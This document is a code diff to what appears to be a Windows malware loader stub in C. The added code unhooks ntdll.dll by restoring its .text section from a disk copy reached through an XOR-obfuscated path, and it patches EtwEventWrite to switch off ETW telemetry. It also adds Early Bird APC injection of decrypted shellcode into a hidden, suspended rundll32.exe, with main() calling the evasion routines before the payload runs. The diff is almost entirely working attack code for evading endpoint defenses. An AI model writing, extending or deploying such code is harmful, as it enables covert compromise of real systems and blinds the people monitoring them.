@@ -5,6 +5,8 @@
 #include "ReflectiveLoader.h"
 #include <stdio.h>
 
+#define EARLY_BIRD_MODE 1  // Set to 0 for classic APC, 1 for Early Bird
+
 #ifdef DEBUG
   // variadic macro that works even if you pass only fmt
   #define DBG(fmt, ...) do {                                    \
@@ -136,6 +138,89 @@ int download_payload() {
     return 1;
 }
 
+typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+VirtualProtect_t VirtualProtect_p = NULL;
+
+int UnhookNtdll(HMODULE hNtdll, LPVOID pMapping) {
+    DWORD oldProtect = 0;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMapping;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + dosHeader->e_lfanew);
+
+    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader) + i;
+        if (memcmp(section->Name, ".text", 5) == 0) {
+            void* ntdllTextAddr = (BYTE*)hNtdll + section->VirtualAddress;
+            VirtualProtect_p(ntdllTextAddr, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+            memcpy(ntdllTextAddr, (BYTE*)pMapping + section->VirtualAddress, section->Misc.VirtualSize);
+            VirtualProtect_p(ntdllTextAddr, section->Misc.VirtualSize, oldProtect, &oldProtect);
+            return 0;
+        }
+    }
+    return -1;
+}
+
+void DisableETW() {
+    DWORD oldProtect;
+    void* pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
+    if (!pEtwEventWrite) return;
+
+    VirtualProtect_p(pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
+#ifdef _WIN64
+    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
+#else
+    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 0x14
+#endif
+    memcpy(pEtwEventWrite, patch, sizeof(patch));
+    VirtualProtect_p(pEtwEventWrite, 8, oldProtect, &oldProtect);
+    FlushInstructionCache(GetCurrentProcess(), pEtwEventWrite, 8);
+}
+
+
+void XORDecrypt(unsigned char* data, size_t len, unsigned char key) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+void PatchETWUnhookNtdll() {
+
+    unsigned char obf_ntdll_path[] = {
+    0x79, 0x00, 0x66, 0x6D, 0x53, 0x54, 0x5E, 0x55, 0x4D, 0x49,
+    0x66, 0x69, 0x43, 0x49, 0x4E, 0x5F, 0x57, 0x09, 0x08, 0x66,
+    0x54, 0x4E, 0x5E, 0x56, 0x56, 0x14, 0x5E, 0x56, 0x56, 0x3A
+    };
+
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
+
+    unsigned char key = obf_ntdll_path[sizeof(obf_ntdll_path) - 1];
+    XORDecrypt(obf_ntdll_path, sizeof(obf_ntdll_path), key);
+    HANDLE hFile = CreateFileA((char*)obf_ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMapping) {
+        CloseHandle(hFile);
+        return;
+    }
+
+    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pMapping) {
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
+        return;
+    }
+
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    UnhookNtdll(hNtdll, pMapping);
+
+    UnmapViewOfFile(pMapping);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+
+    DisableETW();
+}
+
 void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
     LPVOID dll_mem = VirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!dll_mem) return;
@@ -150,19 +235,28 @@ void inject_APC(unsigned char *sc, size_t l) {
     char str_target[] = "C:\\Windows\\System32\\rundll32.exe";
 
     STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {0};
+    PROCESS_INFORMATION pi = { 0 };
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
     if (!CreateProcessA(str_target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         return;
 
-    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, l, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!mem) { TerminateProcess(pi.hProcess, 1); return; }
-    if (!WriteProcessMemory(pi.hProcess, mem, sc, l, NULL)) { TerminateProcess(pi.hProcess, 1); return; }
+    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, l, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote) { TerminateProcess(pi.hProcess, 1); return; }
 
-    QueueUserAPC((PAPCFUNC)mem, pi.hThread, (ULONG_PTR)mem);
+    if (!WriteProcessMemory(pi.hProcess, remote, sc, l, NULL)) { TerminateProcess(pi.hProcess, 1); return; }
+
+    QueueUserAPC((PAPCFUNC)remote, pi.hThread, (ULONG_PTR)0);
+
+#if EARLY_BIRD_MODE
+    // Early Bird APC injection: APC queued *before* ResumeThread(), thread hasn't reached user mode yet.
     ResumeThread(pi.hThread);
+#else
+    // Classic APC injection: Give EDRs a race window
+    ResumeThread(pi.hThread);
+    Sleep(50);  // Optional: small delay to improve reliability if needed.
+#endif
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
@@ -185,6 +279,8 @@ int main() {
         buf = payload_ptr;
         len = payload_len;
     }
+
+    PatchETWUnhookNtdll();
 
     DBG("[*] stub: decrypting payload (len=%zu)\n", len);
     decrypt_payload(buf, len);
